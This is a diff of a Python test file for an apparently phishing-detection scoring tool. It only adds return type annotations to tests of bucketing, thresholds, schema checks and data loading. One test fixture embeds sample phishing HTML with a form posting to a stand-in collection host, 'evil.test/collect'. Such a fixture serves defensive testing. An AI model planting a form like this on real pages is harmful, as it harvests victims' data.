@@ -28,7 +28,7 @@ def _hand_fpr(scores: np.ndarray, labels: np.ndarray, thr: float) -> float:
     return float((neg >= thr).sum() / neg.size)
 
 
-def test_bucket_boundaries_are_half_open():
+def test_bucket_boundaries_are_half_open() -> None:
     lo, hi = 0.3, 0.9
     assert bands.bucket(0.2999, lo, hi) == bands.BELOW
     assert bands.bucket(lo, lo, hi) == bands.BAND  # lower edge IN band
@@ -38,7 +38,7 @@ def test_bucket_boundaries_are_half_open():
     assert bands.bucket(float("inf"), lo, hi) == bands.ALERT
 
 
-def test_every_row_in_exactly_one_bucket():
+def test_every_row_in_exactly_one_bucket() -> None:
     lo, hi = 0.3, 0.9
     rng = np.random.default_rng(0)
     scores = np.concatenate(
@@ -51,7 +51,7 @@ def test_every_row_in_exactly_one_bucket():
     )
 
 
-def test_threshold_buckets_share_comparison_direction():
+def test_threshold_buckets_share_comparison_direction() -> None:
     rng = np.random.default_rng(7)
     scores = rng.uniform(0, 1, 400)
     labels = (rng.uniform(0, 1, 400) < 0.4).astype(int)
@@ -66,7 +66,7 @@ def test_threshold_buckets_share_comparison_direction():
         )
 
 
-def test_nextafter_phishing_anchor_sits_in_alert():
+def test_nextafter_phishing_anchor_sits_in_alert() -> None:
     lo, hi = 0.3, 0.9
     anchor = math.nextafter(hi, math.inf)
     assert anchor > hi
@@ -74,7 +74,7 @@ def test_nextafter_phishing_anchor_sits_in_alert():
     assert bands.in_band(anchor, lo, hi) is False
 
 
-def test_model_text_never_carries_raw_html():
+def test_model_text_never_carries_raw_html() -> None:
     html = (
         "<html><head><title>T</title></head><body>"
         "<form action='https://evil.test/collect'>"
@@ -90,7 +90,7 @@ def test_model_text_never_carries_raw_html():
     assert isinstance(extract["forms"], list)
 
 
-def test_response_schema_is_strict_compatible():
+def test_response_schema_is_strict_compatible() -> None:
     assert is_strict_compatible(RESPONSE_SCHEMA)
     assert set(RESPONSE_SCHEMA["required"]) == set(RESPONSE_SCHEMA["properties"])
     assert RESPONSE_SCHEMA["additionalProperties"] is False
@@ -102,7 +102,7 @@ def _manifest(rows: list[tuple[int, str, str]]) -> pd.DataFrame:
     )
 
 
-def test_trigger_requires_all_three_conditions():
+def test_trigger_requires_all_three_conditions() -> None:
     good = (
         [(1, "train", "ok")] * 80
         + [(1, "train", "timeout")] * 20
@@ -143,7 +143,7 @@ def test_trigger_requires_all_three_conditions():
     assert trigger_verdict(_manifest(bad_gap))["option"] == OPTION1
 
 
-def test_tier1_loads_pinned_row_a():
+def test_tier1_loads_pinned_row_a() -> None:
     """The headline path loads row (a) by hash, never a substitute.
 
     The "0.94" this guards against: a 200-row calib probe scored the same
